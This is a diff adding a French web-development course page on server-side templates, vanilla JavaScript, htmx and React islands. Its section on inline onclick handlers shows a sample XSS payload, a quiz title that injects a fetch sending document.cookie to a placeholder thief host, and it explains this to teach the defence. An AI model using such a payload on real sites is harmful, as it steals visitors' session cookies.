@@ -1,0 +1,176 @@
+---
+sidebar_position: 4
+sidebar_label: Le web sans React
+description: "Gabarits, JavaScript vanille, htmx : le rendu côté serveur sans framework"
+---
+
+# Le web sans React
+
+Ce cours utilise React, mais il faut le dire clairement : **une énorme
+partie du web ne l'utilise pas**. Amazon (le site de vente) est
+essentiellement du HTML rendu au serveur avec du JavaScript maison ; GitHub
+a longtemps tourné avec Rails et jQuery, remplacés depuis par du JavaScript
+vanille et des Web Components ; Wikipédia et la plupart des sites de presse
+fonctionnent de même. Cette page montre comment ces sites s'y prennent,
+pour situer React dans un paysage plus large que celui du cours.
+
+## Les moteurs de gabarits
+
+Le rendu côté serveur a été la façon normale de faire du web pendant vingt
+ans, bien avant React : c'est le monde des **moteurs de gabarits**
+(*template engines*). Le serveur prend un gabarit HTML à trous, y insère
+les données, et envoie le résultat :
+
+```html title="un gabarit EJS (Node), sans aucun React"
+<ul>
+  <% quizzes.forEach((quiz) => { %>
+    <li><%= quiz.title %></li>
+  <% }) %>
+</ul>
+```
+
+EJS ou Pug côté Node, Jinja avec Django (Python), Blade avec Laravel
+(PHP), et tout WordPress : c'est toujours bien vivant. Express lui-même
+sait faire : `app.set('view engine', 'ejs')`, puis `res.render('quizzes',
+{ quizzes })` au lieu de `res.json(quizzes)`, et la route renvoie du HTML
+complet. Le terme « SSR » n'est devenu à la mode que quand le monde React
+a redécouvert ce que le monde PHP n'avait jamais cessé de faire. La
+différence n'est pas le *où* du rendu, mais l'outillage : un gabarit
+interpole des chaînes dans du HTML, React exécute des composants.
+
+## Ajouter du comportement : le JavaScript « vanille »
+
+Le HTML d'un gabarit est inerte, comme celui du SSR de React. Mais ici,
+pas besoin d'hydratation : on ajoute une bonne vieille balise `<script>`
+et on attache les écouteurs à la main.
+
+```html title="dans le gabarit"
+<ul>
+  <% quizzes.forEach((quiz) => { %>
+    <li>
+      <%= quiz.title %>
+      <button class="supprimer" data-id="<%= quiz.id %>">Supprimer</button>
+    </li>
+  <% }) %>
+</ul>
+<script src="/js/quizzes.js"></script>
+```
+
+```js title="public/js/quizzes.js"
+document.querySelectorAll('.supprimer').forEach((bouton) => {
+  bouton.addEventListener('click', async () => {
+    await fetch(`/api/quizzes/${bouton.dataset.id}`, { method: 'DELETE' });
+    bouton.closest('li').remove();
+  });
+});
+```
+
+C'est le modèle de **l'amélioration progressive** : la page est un
+document qui se suffit à lui-même, et le JavaScript vient ajouter du
+confort par-dessus. Le délai entre « visible » et « interactif » existe
+ici aussi (il faut télécharger et exécuter le script), mais ce script fait
+quelques kilooctets au lieu des centaines de kilooctets d'une application
+React : la fenêtre est minuscule.
+
+La contrepartie : **chaque mise à jour de la page, c'est vous qui
+l'écrivez**. Trouver le bon élément, changer son texte, ajouter un `<li>`,
+retirer une classe. Pour trois boutons, c'est très bien. Pour une
+interface entière qui dépend d'un état qui change constamment (le salon
+d'attente de Quiz M9, où la liste des joueurs bouge chaque seconde), ça
+devient ingérable : c'est précisément le problème que React résout en
+recalculant le DOM à partir de l'état.
+
+## Pourquoi pas `onclick="..."` directement dans le HTML ?
+
+Il existe une façon encore plus directe : mettre le code dans l'attribut.
+
+```html
+<button onclick="supprimer(42)">Supprimer</button>
+```
+
+Le bouton marche dès que le HTML est analysé, sans attendre aucun script
+externe. Tentant, mais c'est une pratique **découragée**, pour deux
+familles de raisons.
+
+**La maintenabilité.** Le comportement est éparpillé dans le gabarit : pour
+savoir ce que fait la page, il faut lire tout le HTML. Les fonctions
+appelées doivent être **globales** (accrochées à `window`), ce qui crée
+des collisions de noms dès que la page grossit. Et le jour où le
+comportement change, il faut retoucher chaque attribut : quarante boutons,
+quarante `onclick` à modifier, contre un seul `querySelectorAll` dans un
+fichier JS.
+
+**La sécurité.** Un `onclick` est du code JavaScript écrit *dans* le HTML.
+Si le gabarit y insère une donnée qui vient des utilisateurs, cette donnée
+devient du code :
+
+```html title="la faille"
+<!-- le titre vient de la base de données -->
+<button onclick="supprimer('<%= quiz.title %>')">Supprimer</button>
+```
+
+Il suffit qu'un utilisateur nomme son questionnaire
+`'); fetch('https://voleur.example/?c=' + document.cookie); ('` pour que
+ce code s'exécute chez **tous les visiteurs** de la page. C'est une
+attaque **XSS** (*cross-site scripting*). Avec
+`data-id="..."` + `addEventListener`, la donnée reste une donnée : elle
+n'est jamais interprétée comme du code.
+
+La parade moderne enfonce le clou : l'en-tête
+[`Content-Security-Policy`](https://developer.mozilla.org/fr/docs/Web/HTTP/Guides/CSP)
+(CSP) permet au serveur de déclarer « seuls mes fichiers `.js` ont le
+droit de s'exécuter ». Avec une CSP sérieuse, **tout JavaScript écrit
+directement dans le HTML est bloqué par le navigateur**, les `onclick`
+compris. Les sites qui l'activent n'ont donc tout simplement plus le choix.
+
+## htmx : pousser le HTML jusqu'au bout
+
+Et si le serveur restait responsable du HTML **même après** le
+chargement ? C'est le pari de [htmx](https://htmx.org/), une petite
+bibliothèque (une quinzaine de kilooctets) qui lit des attributs dans le
+HTML :
+
+```html
+<button hx-delete="/quizzes/42" hx-target="closest li" hx-swap="outerHTML">
+  Supprimer
+</button>
+```
+
+Au clic, htmx envoie la requête `DELETE`, et remplace le `<li>` par le
+HTML que le serveur renvoie en réponse. Pas de JSON, pas d'état côté
+client, pas de code à écrire pour ce bouton : le serveur renvoie du HTML,
+comme avec un gabarit, mais **par petits fragments**. Notez la différence
+avec `onclick` : ces attributs sont **déclaratifs** (ils décrivent quoi
+faire, sans contenir de code), donc le problème d'injection de code vu
+plus haut ne se pose pas de la même façon.
+
+Cette approche connaît un vrai regain : pour un site surtout fait de
+formulaires et de listes, comme un back-office (l'interface
+d'administration d'un site, réservée aux gestionnaires : l'espace
+animateur de Quiz M9 en est un), elle donne des pages rapides avec très
+peu de JavaScript.
+
+## Mélanger : les îlots
+
+On peut aussi mélanger les mondes : le serveur rend la page avec un
+gabarit, et sur un ou deux `<div>` précis, on monte un composant React
+avec `createRoot()`. On appelle souvent ça des **îlots** (*islands*) : un
+back-office rendu par Django avec un composant de graphique en React, par
+exemple. Les données passent au composant par un `<script>` JSON ou des
+attributs `data-*`. Les limites : ces îlots sont rendus côté client (le
+test de la source ne montre pas leur contenu), et chaque lien recharge la
+page au complet.
+
+## Alors, pourquoi React ?
+
+Toutes ces approches répondent à la même question de conception : la page
+est-elle un **document avec un peu d'interactivité**, ou une **application
+avec un peu de document** ?
+
+| Approche | Qui met la page à jour après le chargement | Bon pour |
+|---|---|---|
+| Gabarit + JS vanille | votre code, à la main dans le DOM | documents, quelques boutons |
+| Gabarit + htmx | le serveur, par fragments HTML | formulaires, listes, back-offices |
+| Gabarit + îlots React | React, sur quelques zones précises | un document avec un ou deux widgets riches |
+| Tout React (+ SSR) | React, partout | une vraie application |
+
